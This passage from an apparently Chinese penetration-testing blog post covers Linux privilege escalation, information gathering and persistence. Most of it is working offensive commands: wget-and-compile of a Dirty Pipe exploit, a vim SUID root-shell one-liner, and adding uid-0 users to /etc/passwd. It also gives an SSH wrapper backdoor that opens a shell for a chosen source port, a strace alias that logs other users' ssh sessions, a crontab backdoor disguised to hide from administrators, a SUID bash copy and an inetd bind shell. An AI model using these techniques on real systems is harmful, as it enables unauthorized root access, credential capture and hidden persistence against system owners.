href="https://www.freebuf.com/articles/es/377292.html">一个未公开的容器逃逸方式 - FreeBuf网络安全行业门户</a></p><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><h3 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a><strong><a href="https://gtfobins.github.io/">GTFOBins</a></strong></h3><p>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制。该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利。需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，<strong>GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限</strong>。</p><h3 id="beroot"><a href="#beroot" class="headerlink" title="beroot"></a><strong>beroot</strong></h3><p>BeRoot用于检查Linux和Mac OS上常见的错误配置，以找到一种方法来升级我们的特权。检查项包括GTFOBins中的二进制文件、通配符错误、suid、环境变量、NFS、sudo等等</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 beroot.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015201659431.png" alt="image-20231015201659431"></p><p><img src="/../images/image-20231015201711821.png" alt="image-20231015201711821"></p><p><img src="/../images/image-20231015201721586.png" alt="image-20231015201721586"></p><h3 id="Linepeas–不只是提权"><a href="#Linepeas–不只是提权" class="headerlink" title="Linepeas–不只是提权"></a><strong>Linepeas–不只是提权</strong></h3><p>LinPEAS 是一个脚本，用于搜索在 Linux&#x2F;Unix*&#x2F;MacOS 主机上提升权限的可能路径。</p><p><a href="https://www.ddosi.org/peass-ng/">PEASS-ng Windows&#x2F;linux&#x2F;unix*&#x2F;macOS提权工具 - 🔰雨苁ℒ🔰 (ddosi.org)</a></p><h3 id="pspy–进程监控"><a href="#pspy–进程监控" class="headerlink" title="pspy–进程监控"></a><strong>pspy</strong>–进程监控</h3><p>Pspy是一个命令行工具，用于在不需要root权限的情况下窥探进程。该工具通关循环遍历&#x2F;proc下的值来获取进程参数信息。比如说我们可以找到一些定时任务进程或其他可疑进程来尝试提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pspy64</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015201909328.png" alt="image-20231015201909328"></p><h3 id="traior–自动化提权🐂"><a href="#traior–自动化提权🐂" class="headerlink" title="traior–自动化提权🐂"></a>traior–自动化提权🐂</h3><p>多个linux提权漏洞缝合怪，运行后会给出提权方法，并内置了exp可以直接使用</p><p><img src="/../images/image-20231015202209167.png" alt="image-20231015202209167"></p><p><img src="/../images/image-20231015202355175.png" alt="image-20231015202355175"></p><p><img src="/../images/image-20231015202422512.png" alt="image-20231015202422512"></p><h2 id="常见提权手法"><a href="#常见提权手法" class="headerlink" title="常见提权手法"></a>常见提权手法</h2><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>强调利用内核漏洞的几个<strong>注意点</strong>：</p><ol><li>读源码注释，有exp基本信息和编译方法，不然可能连编译都不会</li><li>读源码，不然费劲编译完才发现不适用</li><li>读源码，不然遇到一个删全盘的”exp“怎么办</li><li>遇到没有gcc的坑爹服务器。这时我们就需要在本地编译。本地编译时不止要看exp源码注释的编译参数，也需要手动调整一下编译的参数，比如给gcc 加-m 32来编译32位。编译问题繁多，有困难找谷歌。</li></ol><ul><li><p><strong>脏牛漏洞（CVE-2016-5195）</strong></p><blockquote><p>漏洞原理：该漏洞具体为，get_user_page内核函数在处理<strong>Copy-on-Write</strong>(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。<strong>修改su或者passwd程序</strong>就可以达到root的目的。</p></blockquote><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">PoCs · dirtycow&#x2F;dirtycow.github.io Wiki</a></p></li><li><p><strong>Dirty Pipe(CVE-2022-0847)</strong></p><ul><li><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p><p>覆盖 &#x2F;etc&#x2F;passwd 中的 root 密码字段并在弹出 root shell 后恢复</p></li><li><p><a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p><p>直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc -o dirtypipez dirtypipez.c</span><br><span class="line">./dirtypipez /usr/bin/su  <span class="comment">#任何具体suid权限的文件均可</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015204347541.png" alt="image-20231015204347541"></p></li></ul></li></ul><h3 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h3><ul><li><p>从脏管道（CVE-2022-0847）到 Docker 逃逸</p><p><img src="/../images/image-20231015202422512.png?lastModify=1697447453" alt="image-20231015202422512"></p></li><li><p>CVE-2022-23222–不稳定</p><p>影响版本：5.8.0 &lt;&#x3D; Linux 内核 &lt;&#x3D; 5.16</p><p><a href="https://github.com/tr3ee/CVE-2022-23222.git">https://github.com/tr3ee/CVE-2022-23222.git</a></p></li><li><p>Docker 用户组提权</p><p><a href="http://124.220.192.120:7777/CloudNative/Docker/docker-user-group-privilege-escalation.html">Docker 用户组提权 | T Wiki</a></p></li></ul><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">谈一谈Linux与suid提权 | 离别歌 (leavesongs.com)</a></p><p><img src="/../images/image-20230220142509956.png" alt="image-20230220142509956"></p><blockquote><p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。</p><p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p></blockquote><p><img src="/../images/image-20230220142233418.png" alt="image-20230220142233418"></p><p>查找具有s位权限的命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>常见suid提权命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec command \;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vim -c &#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><blockquote><p>sudo：super user do</p></blockquote><h4 id="不恰当的sudo命令配置"><a href="#不恰当的sudo命令配置" class="headerlink" title="不恰当的sudo命令配置"></a>不恰当的sudo命令配置</h4><p>原理：</p><p>在<strong>交互模式</strong>以及<strong>无密码</strong>情况下（知道密码直接切换为root用户就好了）可以使用<code>sudo -l</code>查找哪些命令可以以root权限执行，使用这些命令创建一个新shell即可提权</p><p><img src="/../images/image-20230220161114377.png" alt="image-20230220161114377"></p><p><img src="/../images/image-20230220161140688.png" alt="image-20230220161140688"></p><p>在vi的ESC模式下输入<code>!/bin/bash</code>后按下回车即可变为root权限。</p><h4 id="Linux-sudo权限提升漏洞（CVE-2021-3156）–-成功率高"><a href="#Linux-sudo权限提升漏洞（CVE-2021-3156）–-成功率高" class="headerlink" title="Linux sudo权限提升漏洞（CVE-2021-3156）– 成功率高"></a>Linux sudo权限提升漏洞（CVE-2021-3156）– 成功率高</h4><p><strong>查看sudo版本</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure><p><strong>版本影响</strong></p><ul><li><p>sudo 1.8.2 - 1.8.31p2</p></li><li><p>sudo 1.9.0 - 1.9.5p1</p></li></ul><p><strong>简单判断方法</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure><blockquote><p>如果显示sudoedit: &#x2F;: not a regular file，则表示该漏洞存在</p></blockquote><p><strong>EXP使用</strong></p><p><a href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p><ul><li><p>对于 glibc 支持并启用了 tcache 的 Linux 发行版（CentOS 8、Ubuntu &gt;&#x3D; 17.10、Debian 10）</p><p>exploit_nss.py→exploit_timestamp_race.c</p></li><li><p>对于 glibc 不支持 tcache 的 Linux 发行版（Debian 9, Ubuntu 16.04, or Ubuntu 14.04）</p><p>exploit_nss_xxx.py→exploit_defaults_mailer.py→exploit_userspec.py</p></li></ul><p><a href="https://github.com/blasty/CVE-2021-3156">blasty&#x2F;CVE-2021-3156 (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./sudo-hax-me-a-sandwich num <span class="comment"># 选择合适的序号</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015214211618.png" alt="image-20231015214211618"></p><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p>本质上还是suid提权，只不过具有suid权限的命令是用户自定义的，调用了其他命令，我们可以通过劫持调用的其他命令来提权。</p><p>比如有一个root用户自定义的具有suid权限的test命令，调用了系统命令ls，那我们可以找到一个可写目录，通过修改$PATH环境变量，劫持ls命令。</p><p>参考<a href="https://fgtbnc.github.io/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">环境变量注入 | Khaz’s Blog (fgtbnc.github.io)</a></p><h3 id="权限配置不当提权"><a href="#权限配置不当提权" class="headerlink" title="权限配置不当提权"></a>权限配置不当提权</h3><p>原理：某个脚本或命令以ROOT权限运行，但是低权限用户拥有修改写入权限</p><ul><li>通过pspy找到可疑进程</li><li>定时任务</li><li>…..</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h4><p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p><p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录（空密码不能远程登录）。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p><h1 id="Linux信息收集"><a href="#Linux信息收集" class="headerlink" title="Linux信息收集"></a>Linux信息收集</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gather -a</span><br></pre></td></tr></table></figure><p>默认在<code>/tmp/report</code>下生成结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keyword.txt <span class="comment"># 这个有点少，要自己加</span></span><br><span class="line">result.txt</span><br><span class="line">tree.txt <span class="comment"># 目录结构</span></span><br></pre></td></tr></table></figure><p><strong>自己添加命令整理成sh脚本</strong></p><h1 id="Linux横向移动"><a href="#Linux横向移动" class="headerlink" title="Linux横向移动"></a>Linux横向移动</h1><p>隧道搭建后，进行主机和端口探测，跟外网差不多</p><ul><li><p>Fscan</p></li><li><p>LadonGo</p></li><li><p>敏感信息收集</p></li></ul><h1 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h3><p>被攻击机</p><blockquote><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会导致ssh不能用</span></span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd  </span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><blockquote><p> \x00\x004A是13377的大端形式</p></blockquote><p>攻击机</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:IP:22,sourceport=port</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230823151639936.png" alt="image-20230823151639936"></p><p>修改通信端口</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">port = <span class="number">19526</span></span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,port)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"></span><br><span class="line">&gt;&gt;<span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd </span><br><span class="line">变为</span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..LF/);&#x27;</span> &gt;&gt;sshd </span><br></pre></td></tr></table></figure><h3 id="SSH-软连接后门"><a href="#SSH-软连接后门" class="headerlink" title="SSH 软连接后门"></a>SSH 软连接后门</h3><blockquote><ol><li><p>PAM认证机制，若sshd服务中开启了PAM认证机制（默认开启<code>cat /etc/ssh/sshd_config|grep UsePAM</code>），当程序执行时，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在&#x2F;etc&#x2F;pam.d&#x2F;。若关闭则会验证密码，无法建立软链接后门。</p></li><li><p>pam_rootok.so主要作用是使得uid为0的用户，即root用户可以直接通过认证而不需要输入密码。</p></li><li><p><code>find /etc/pam.d |xargs grep &quot;pam_rootok&quot; </code></p><p><img src="/../images/image-20230830230859930.png" alt="image-20230830230859930"></p><p><strong>这些都可以作为ssh软链接后门</strong>：当我们通过特定的端口连接ssh后，应用在启动过程中就会去找到配置文件，如：我们的软链接文件为&#x2F;tmp&#x2F;su，那么应用就会找&#x2F;etc&#x2F;pam.d&#x2F;su作为配置文件，因为&#x2F;etc&#x2F;pam.d&#x2F;su使用了pam_rootok.so所以无需验证密码即可连接。</p></li></ol></blockquote><p>失败了。。</p><p><img src="/../images/image-20230830222011164.png" alt="image-20230830222011164"></p><p>是因为SSH wrapper</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br></pre></td></tr></table></figure><p>需要重新安装ssh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/su /tmp/su</span><br><span class="line">/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830230550836.png" alt="image-20230830230550836"></p><p>实际上是随便输一个密码就可以登陆，但是不能不输密码。</p><h3 id="SSH-公钥免密登陆"><a href="#SSH-公钥免密登陆" class="headerlink" title="SSH 公钥免密登陆"></a>SSH 公钥免密登陆</h3><p>之前打靶机的时候的笔记</p><p>ssh验证方式</p><p><img src="/../images/image-20230304140701229-1693405604693.png" alt="image-20230304140701229"></p><p>这里第二种：假设主机A要用SSH登录到主机B，那么只要主机A有私钥，主机B有对应的公钥即可，与是主机A生产的，还是主机B生成的无关。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">host为主机名（root）</span></span><br><span class="line">ssh host@ip -p port（password验证）</span><br><span class="line">ssh host@ip -i id_rsa -p port(密钥验证，私钥权限要为600才可以使用)</span><br></pre></td></tr></table></figure><p>配置文件<code>/etc/ssh/sshd_config</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes #启用密码验证</span><br><span class="line">PubkeyAuthentication yes #启用密钥对验证</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys #指定公钥库文件</span><br></pre></td></tr></table></figure><p>流程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa # 生成密钥对</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys #将公钥内容放到目标.ssh/authorized_keys里 </span><br><span class="line"></span><br><span class="line">ssh-copy-id host@ip -p 22 #将公钥上传至远程服务器用户目录中</span><br></pre></td></tr></table></figure><h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>通过<strong>命令替换（命令行启动文件加入alias）</strong>动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监控ssh</span></span><br><span class="line">echo &quot;alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;&quot; &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">立即生效</span></span><br><span class="line">source /root/.bashrc</span><br></pre></td></tr></table></figure><p>kali没有strace，但是云服务器默认是装了的</p><p><img src="/../images/image-20230830223830491.png" alt="image-20230830223830491"></p><p>查看记录的ssh连接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /tmp/.ssh.log </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830232440346.png" alt="image-20230830232440346"></p><h2 id="自启动文件后门"><a href="#自启动文件后门" class="headerlink" title="自启动文件后门"></a>自启动文件后门</h2><p>写入自启动文件中</p><ul><li><p>开机启动项</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/</span><br><span class="line">/etc/profile.d/</span><br><span class="line">/etc/rc.d/xxx <span class="comment"># 在xxx中添加需要开机执行的脚本的绝对路径</span></span><br></pre></td></tr></table></figure></li><li><p>bash shell启动项</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/profile </span><br><span class="line"><span class="variable">$HOME</span>/.bash_profile</span><br><span class="line"><span class="variable">$HOME</span>/.bashrc </span><br><span class="line"><span class="variable">$HOME</span>/.bash_login </span><br><span class="line"><span class="variable">$HOME</span>/.profile </span><br></pre></td></tr></table></figure></li></ul><h2 id="定时任务后门"><a href="#定时任务后门" class="headerlink" title="定时任务后门"></a>定时任务后门</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo xxx &gt; /tmp/1.elf</span><br><span class="line">chmod +x /tmp/1.elf</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230830235507613.png" alt="image-20230830235507613"></p><p>将no crontab for <code>whoami</code>文件写到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root中，而crontab -l就是列出了该文件的内容。所以当管理员使用crontab -l查看定时任务时，就会看到no crontab for root，从而起到了隐藏的效果。</p><p><img src="/../images/image-20230830235746458.png" alt="image-20230830235746458"></p><h2 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h2><p>应急响应第一个就排查<code>/etc/passwd</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230831001351639.png" alt="image-20230831001351639"></p><h2 id="Suid后门"><a href="#Suid后门" class="headerlink" title="Suid后门"></a>Suid后门</h2><blockquote><p><strong>SUID权限仅对二进制程序有效</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/.long #将bash命令cp到.long二进制程序中</span><br><span class="line">chmod u+s /tmp/.long #赋予SUID文件的权限</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/.long -p </span><br></pre></td></tr></table></figure><blockquote><p>bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。</p></blockquote><p><img src="/../images/image-20230831155343319.png" alt="image-20230831155343319"></p><h2 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h2><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt-get install openbsd-inetd  </span><br><span class="line"><span class="comment"># 写入配置文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;daytime stream tcp nowait root /bin/bash bash -i&#x27;</span> &gt;&gt; /etc/inetd.conf</span><br><span class="line"><span class="comment"># 请求daytime服务对应的13端口</span></span><br><span class="line">nc -vv 192.168.111.128 13</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015225609770.png" alt="image-20231015225609770"></p><p>配置解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;service_name&gt; &lt;sock_type&gt; &lt;proto：TCP/UDP&gt; &lt;flags&gt; &lt;user&gt; &lt;server_path：绝对路径&gt; &lt;args&gt;</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i <span class="comment"># 当外部请求名为daytime的服务时就弹shell</span></span><br></pre></td></tr></table></figure><p>更改的话只需要修改service_name和nc连接的端口，服务与端口的映射关系在<code>/etc/services</code>中</p><h2 id="ICMP后门"><a href="#ICMP后门" class="headerlink" title="ICMP后门"></a>ICMP后门</h2><p><a href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p><h2 id="DNS后门"><a href="#DNS后门" class="headerlink" title="DNS后门"></a>DNS后门</h2><p><a href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a><br><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br><a href="http://code.kryo.se/iodine">http://code.kryo.se/iodine</a></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p><a href="https://github.com/gaffe23/linux-inject">https://github.com/gaffe23/linux-inject</a><br><a href="https://sourceforge.net/projects/cymothoa/files/">https://sourceforge.net/projects/cymothoa/files/</a><br><a href="https://github.com/screetsec/Vegile">https://github.com/screetsec/Vegile</a></p><h2 id="隐藏文件-x2F-目录技巧"><a href="#隐藏文件-x2F-目录技巧" class="headerlink" title="隐藏文件&#x2F;目录技巧"></a>隐藏文件&#x2F;目录技巧</h2><ul><li><p>创建以.开头的隐藏文件</p><p>用<code>ls -a</code>才能看到</p></li><li><p>建立文件名为<code>...</code>的文件</p></li><li><p>参数混淆</p><blockquote><p>下面两种方法可以使用<code>rm -- -rm</code>删除</p></blockquote><ul><li>建立文件名为<code>-rm</code>的文件</li></ul><p><img src="/../images/image-20231015223351352.png" alt="image-20231015223351352"></p><ul><li><p>建立文件名为<code>--</code>的文件</p><p><img src="/../images/image-20231015223510528.png" alt="image-20231015223510528"></p><p>既不报错，也没有删除</p></li></ul></li><li><p>chattr隐藏权限</p><blockquote><p>chattr +i 是一个 Linux 命令，用于将文件或目录设置为不可修改（immutable）。当应用了 +i 属性后，文件或目录将无法被修改、删除、重命名或链接。这个属性主要用于保护关键系统文件或目录，防止它们被意外或恶意篡改。请注意，这个命令需要在<strong>具有管理员权限的用户</strong>下执行</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i hack.sh  <span class="comment">#lsattr才可以看到该权限</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230831163015163.png" alt="image-20230831163015163"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除</span></span><br><span class="line">chattr -i hack.sh</span><br><span class="line"><span class="built_in">rm</span> -rf hack.sh</span><br></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>需要python3环境<a href="https://github.com/RuoJi6/HackerPermKeeper">RuoJi6&#x2F;HackerPermKeeper (github.com)</a></p><table><thead><tr><th>🔒权限维持模块</th><th>centos</th><th>Ubuntu</th><th>推荐指数</th><th>需要权限</th><th>备注</th><th>py2</th><th>py3</th></tr></thead><tbody><tr><td>OpenSSH后门万能密码&amp;记录密码</td><td>❌</td><td>✔️</td><td>⭐</td><td>root</td><td>此后门需要很老的内核版本，而且需要很多依赖环境</td><td>❌</td><td>✔️</td></tr><tr><td>PAM后门</td><td>❌</td><td>❌</td><td>⭐</td><td>❌</td><td>此后门需要很老的内核版本，而且需要很多依赖环境</td><td>❌</td><td>❌</td></tr><tr><td>ssh软链接</td><td>✔️</td><td>✔️</td><td>⭐ ⭐</td><td>root</td><td>容易被发现</td><td>✔️</td><td>✔️</td></tr><tr><td>ssh公私密钥</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐ ⭐</td><td>User</td><td>发现程度很难，参考了挖矿病毒</td><td>✔️</td><td>✔️</td></tr><tr><td>后门帐号</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐</td><td>root</td><td>用命令添加账户，不会创建用户home目录[有一个是直接指向root目录]</td><td>✔️</td><td>✔️</td></tr><tr><td>crontab计划任务</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐</td><td>User or root</td><td>难以发现，通过执行计划任务</td><td>✔️</td><td>✔️</td></tr><tr><td>Strace后门</td><td>✔️</td><td>✔️</td><td>⭐ ⭐</td><td>root</td><td>键盘记录的后门</td><td>✔️</td><td>✔️</td></tr><tr><td>Alias后门</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐</td><td>root</td><td>别名后门，难以发现，但是需要用户去执行命令</td><td>✔️</td><td>✔️</td></tr><tr><td>Rootkit后门[检测]</td><td>❌</td><td>❌</td><td>⭐ ⭐ ⭐</td><td>root</td><td>难以发现，但是安装复杂，而且指定内核版本</td><td>❌</td><td>❌</td></tr><tr><td>空格不记录命令</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐⭐⭐⭐</td><td>root</td><td>有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令</td><td>✔️</td><td>✔️</td></tr><tr><td>ssh软链接&amp;crontab</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐</td><td>root</td><td>快速生成软链接，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行</td><td>✔️</td><td>✔️</td></tr><tr><td>check.py</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐⭐⭐</td><td>User</td><td>快速检测目标机器可以使用那个权限维持模块</td><td>✔️</td><td>✔️</td></tr><tr><td>sshkey密钥&amp;crontab</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐⭐ ⭐</td><td>User or root</td><td>快速生成ssh密钥，并且执行计划任务，每分钟判断当前密钥和多个文件是否存在，如果被kill掉，就重新执行</td><td>✔️</td><td>✔️</td></tr><tr><td>php权限维持不死免杀马</td><td>✔️</td><td>✔️</td><td>⭐ ⭐ ⭐ ⭐⭐ ⭐</td><td>User or root</td><td>phpweb权限维持马</td><td>✔️</td><td>✔️</td></tr></tbody></table><h1 id="Linux痕迹清理"><a href="#Linux痕迹清理" class="headerlink" title="Linux痕迹清理"></a>Linux痕迹清理</h1><p><a href="https://fgtbnc.github.io/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/#Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86">入侵痕迹清理 | Khaz’s Blog (fgtbnc.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何更换内存条</title>
